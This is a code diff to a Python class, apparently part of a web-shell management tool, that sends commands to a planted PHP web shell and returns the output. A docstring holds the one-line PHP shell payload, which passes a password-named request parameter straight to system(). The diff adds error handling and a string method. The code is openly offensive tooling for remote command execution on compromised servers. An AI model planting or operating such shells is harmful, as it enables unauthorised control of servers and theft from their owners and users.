@@ -1,5 +1,5 @@
 from webshell.shellbase import  SystemShellBase
-
+from lib import request
 '''
 <?php system($_{method}[{password}]);
 '''
@@ -12,5 +12,11 @@ class Shell4(SystemShellBase):
         self.password = password
     
     def run(self,code):
-        return request.request(method=self.method,url=self.url,
+        try:
+            return request.request(method=self.method,url=self.url,
                                 data={self.password:code},params={self.password:code}).text
+        except:
+            return ''
+
+    def __str__(self):
+        return '{}-{}-{}-{}'.format(self.url,self.method,self.password,'system')
